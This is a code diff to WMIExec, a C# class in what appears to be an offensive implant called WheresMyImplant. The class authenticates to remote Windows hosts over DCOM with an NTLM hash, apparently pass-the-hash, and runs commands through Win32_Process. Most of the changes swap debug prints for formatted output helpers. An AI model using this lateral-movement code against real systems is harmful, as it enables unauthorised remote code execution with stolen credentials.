@@ -10,7 +10,10 @@ namespace WheresMyImplant
     class WMIExec : Base, IDisposable
     {
         private String target;
+        private String username;
+        private String domain;
         private String command;
+
         private const Int32 SPLIT_INDEX = 5500;
         private Int32 splitIndexTracker = 0;
         private Boolean requestSplit = false;
@@ -75,7 +78,7 @@ namespace WheresMyImplant
         {
             this.target = target;
 
-            Console.WriteLine("Connecting to {0}:135", target);
+            WriteOutputNeutral(String.Format("Connecting Initiator to {0}:135", target));
             try
             {
                 wmiClientInitiator.Connect(target, 135);
@@ -85,9 +88,7 @@ namespace WheresMyImplant
                 WriteOutput(ex.Message);
             }
 
-            Boolean result = wmiClientInitiator.Connected;
-            Console.WriteLine(result);
-            if (result)
+            if (wmiClientInitiator.Connected)
             {
                 wmiStream = wmiClientInitiator.GetStream();
                 return true;
@@ -134,7 +135,7 @@ namespace WheresMyImplant
             bRemoteHostname = recieve.Skip(42).Take(recieve.Length - 42).ToArray();
             GCHandle handle = GCHandle.Alloc(bRemoteHostname, GCHandleType.Pinned);
             strRemoteHostname = Marshal.PtrToStringUni(handle.AddrOfPinnedObject());
-            Console.WriteLine("Target hostname: {0}", strRemoteHostname);
+            WriteOutputGood(String.Format("Target hostname: {0}", strRemoteHostname));
             handle.Free();
 
             if (null != wmiStream)
@@ -153,7 +154,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean ConnectWMI()
         {
-            Console.WriteLine("Connecting to {0}:135", target);
+            WriteOutputNeutral(String.Format("Connecting to {0}:135", target));
             try
             {
                 wmiClient.Connect(target, 135);
@@ -202,6 +203,9 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal Byte[] GetNetNTLMv2Response(String domain, String username, String hash)
         {
+            this.domain = domain;
+            this.username = username;
+
             assocGroup = recieve.Skip(20).Take(4).ToArray();
 
             String NTLMSSP = BitConverter.ToString(recieve).Replace("-", "");
@@ -374,12 +378,12 @@ namespace WheresMyImplant
 
             if (recieve.Skip(2).Take(1).ToArray().SequenceEqual(new Byte[] { 0x02 }))
             {
-                Console.WriteLine("WMI Access");
+                WriteOutputGood(String.Format(@"{0}/{1} has WMI Access", domain, username));
                 return true;
             }
             else
             {
-                Console.WriteLine(BitConverter.ToString(recieve.Skip(4).Take(4).ToArray()));
+                WriteOutput("[-] Error:" + BitConverter.ToString(recieve.Skip(4).Take(4).ToArray()));
                 return false;
             }
         }
@@ -399,7 +403,6 @@ namespace WheresMyImplant
             Byte[] bPort = new Byte[indexEnd - indexStart];
             Array.Copy(recieve, indexStart, bPort, 0, indexEnd - indexStart);
             Int32.TryParse(Encoding.Unicode.GetString(bPort), out Int32 port);
-            Console.WriteLine(port);
 
             String MEOW = BitConverter.ToString(recieve).Replace("-", "");
             Int32 meowIndex = MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820") / 2;
@@ -410,7 +413,7 @@ namespace WheresMyImplant
             Int32 oxidIndex2 = MEOW.IndexOf(oxid, MEOW.IndexOf(oxid) + 1) / 2;
             uuid = recieve.Skip(oxidIndex2 + 12).Take(16).ToArray();
 
-            Console.WriteLine("Connecting to {0}:{1}", target, port);
+            WriteOutputNeutral(String.Format("Connecting to WMI on {0}:{1}", target, port));
             randomClient = new TcpClient();
             randomClient.Client.ReceiveTimeout = 30000;
             try
@@ -586,7 +589,6 @@ namespace WheresMyImplant
             Byte[] requestUUID = new Byte[0];
             Byte[] stubData;
 
-            Console.WriteLine("Sequence Number: {0}", BitConverter.ToString(sequenceNumber));
             if (sequenceNumber.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }))
             {
                 sequenceNumber = new Byte[] { 0x01, 0x00, 0x00, 0x00 };
@@ -783,6 +785,7 @@ namespace WheresMyImplant
                 opnum = new Byte[] { 0x18, 0x00 };
                 requestUUID = ipid2;
 
+                WriteOutputNeutral("Executing Command via Win32_Process");
                 Byte[] stubLength = BitConverter.GetBytes(command.Length + 1769).Take(2).ToArray();
                 Byte[] stubLength2 = BitConverter.GetBytes(command.Length + 1727).Take(2).ToArray();
                 Byte[] stubLength3 = BitConverter.GetBytes(command.Length + 1713).Take(2).ToArray();
@@ -791,26 +794,20 @@ namespace WheresMyImplant
                 Byte[] bComand = Encoding.UTF8.GetBytes(command);
                 Double paddingCheck = command.Length / 4.0;
 
-                Console.WriteLine("Padding Check " + paddingCheck);
                 if ((paddingCheck + 0.25) == Math.Ceiling(paddingCheck))
                 {
-                    Console.WriteLine(".25");
                     bComand = Misc.Combine(bComand, new Byte[] { 0x00 });
                 }
-                
                 else if ((paddingCheck + 0.50) == Math.Ceiling(paddingCheck))
                 {
-                    Console.WriteLine(".50");
                     bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00 });
                 }
                 else if ((paddingCheck + 0.75) == Math.Ceiling(paddingCheck))
                 {
-                    Console.WriteLine(".75");
                     bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00, 0x00 });
                 }
                 else
                 {
-                    Console.WriteLine("Else");
                     bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
                 }
 
@@ -939,8 +936,6 @@ namespace WheresMyImplant
                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                 stubData = stubCombine.Retrieve();
 
-                Console.WriteLine(stubData.Length);
-                Console.WriteLine(SPLIT_INDEX);
                 if (stubData.Length < SPLIT_INDEX)
                 {
                     flags = new Byte[] { 0x83 };
@@ -950,12 +945,10 @@ namespace WheresMyImplant
                 {
                     requestSplit = true;
                     Decimal splitStageFinal = Math.Ceiling((Decimal)stubData.Length / SPLIT_INDEX);
-                    Console.WriteLine(requestSplitStage);
-                    Console.WriteLine(splitStageFinal);
                     if (requestSplitStage < 2)
                     {
                         requestLength = stubData.Length;
-                        stubData = stubData.Take(SPLIT_INDEX - 1).ToArray();
+                        stubData = stubData.Take(SPLIT_INDEX).ToArray();
                         requestSplitStage = 2;
                         sequenceNumberCounter = 10;
                         flags = new Byte[] { 0x81 };
@@ -996,7 +989,6 @@ namespace WheresMyImplant
             
             if (requestSplit)
             {
-                Console.WriteLine("Request Length: {0}", requestLength);
                 rpcRequest.SetAllocHint(BitConverter.GetBytes(requestLength));
             }
             Byte[] bRPCRequest = rpcRequest.GetRequest();
@@ -1039,7 +1031,6 @@ namespace WheresMyImplant
                 wmiStream.Read(recieve, 0, recieve.Length);
             }
 
-                Console.WriteLine(stage);
             if ("AlterContext" == stage)
             {
                 AlterContext();
@@ -1054,7 +1045,7 @@ namespace WheresMyImplant
             }
             else
             {
-                Console.WriteLine("Incorrect Stage");
+
             }
         }
 
@@ -1068,15 +1059,15 @@ namespace WheresMyImplant
                 wmiStream.Read(recieve, 0, recieve.Length);
             }
             while (wmiStream.DataAvailable) ;
-
+            
             UInt16 processId;
             if (9 != recieve[1145])
             {
                 processId = BitConverter.ToUInt16(recieve.Skip(1141).Take(2).ToArray(), 0);
-                Console.WriteLine("Created Process {0}", processId);
+                WriteOutputGood(String.Format("Created Process {0}", processId));
                 return;
             }
-            Console.WriteLine("Created Process Failed");
+            WriteOutput("[-] Created Process Failed");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
